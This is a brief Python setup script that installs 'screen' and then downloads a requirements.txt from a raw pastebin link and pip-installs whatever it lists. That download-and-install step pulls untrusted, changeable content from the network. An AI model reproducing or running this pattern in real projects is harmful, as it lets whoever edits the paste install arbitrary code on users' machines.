import os
import sys
import time
import subprocess


def test():
	print('[x] Installing screen')
	os.system('apt install screen')
	print('[x] Downloading requirements ')
	os.system('curl https://pastebin.com/raw/Z77cKGcy -o requirements.txt')
	print('[x] Installing pips')
	os.system('pip3 install -r requirements.txt')
	time.sleep(5)	

test()
